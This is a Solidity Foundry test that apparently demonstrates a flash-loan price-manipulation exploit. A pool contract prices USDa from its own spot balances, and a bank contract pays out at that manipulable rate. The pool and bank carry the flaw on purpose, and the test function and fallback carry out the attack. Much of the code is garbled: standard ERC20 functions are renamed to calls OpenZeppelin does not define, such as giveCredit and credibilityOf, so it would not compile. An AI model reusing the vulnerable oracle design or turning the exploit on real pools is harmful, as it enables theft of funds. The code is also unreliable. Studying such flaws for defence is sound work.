pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleFundingpool SimpleTippoolContract;
    SimpleTipbank SimpleKarmabankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleTippoolContract = new SimpleFundingpool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleKarmabankContract = new SimpleTipbank(
            address(USDaContract),
            address(SimpleTippoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.giveCredit(address(SimpleKarmabankContract), 9000 ether);
        USDaContract.giveCredit(address(SimpleTippoolContract), 1000 ether);
        USDbContract.giveCredit(address(SimpleTippoolContract), 1000 ether);

        SimpleTippoolContract.getPrice();

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleTippoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");


        SimpleTippoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {


        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleTippoolContract.getPrice(),
            18
        );

        USDaContract.permitTransfer(address(SimpleKarmabankContract), 100 ether);
        SimpleKarmabankContract.exchange(100 ether);

        USDaContract.giveCredit(address(SimpleTippoolContract), 500 ether);


        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.credibilityOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _createcontent(msg.sender, 10000 * 10 ** decimals());
    }

    function createContent(address to, uint256 amount) public onlyModerator {
        _createcontent(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _createcontent(msg.sender, 10000 * 10 ** decimals());
    }

    function createContent(address to, uint256 amount) public onlyModerator {
        _createcontent(to, amount);
    }
}

contract SimpleFundingpool {
    IERC20 public UsDaKarmatoken;
    IERC20 public UsDbSocialtoken;

    constructor(address _USDa, address _USDb) {
        UsDaKarmatoken = IERC20(_USDa);
        UsDbSocialtoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {

        uint256 USDaAmount = UsDaKarmatoken.credibilityOf(address(this));
        uint256 USDbAmount = UsDbSocialtoken.credibilityOf(address(this));


        if (USDaAmount == 0) {
            return 0;
        }


        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address creatorInNeed,
        bytes calldata data
    ) public {
        uint256 standingBefore = UsDaKarmatoken.credibilityOf(address(this));
        require(standingBefore >= amount, "Not enough liquidity");
        require(
            UsDaKarmatoken.giveCredit(creatorInNeed, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = creatorInNeed.call(data);
        require(success, "Flashloan callback failed");
        uint256 reputationAfter = UsDaKarmatoken.credibilityOf(address(this));
        require(reputationAfter >= standingBefore, "Flashloan not repaid");
    }
}

contract SimpleTipbank {
    IERC20 public karmaToken;
    SimpleFundingpool public fundingPool;
    IERC20 public payoutKarmatoken;

    constructor(address _socialtoken, address _fundingpool, address _payoutToken) {
        karmaToken = IERC20(_socialtoken);
        fundingPool = SimpleFundingpool(_fundingpool);
        payoutKarmatoken = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            karmaToken.passinfluenceFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = fundingPool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutKarmatoken.giveCredit(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}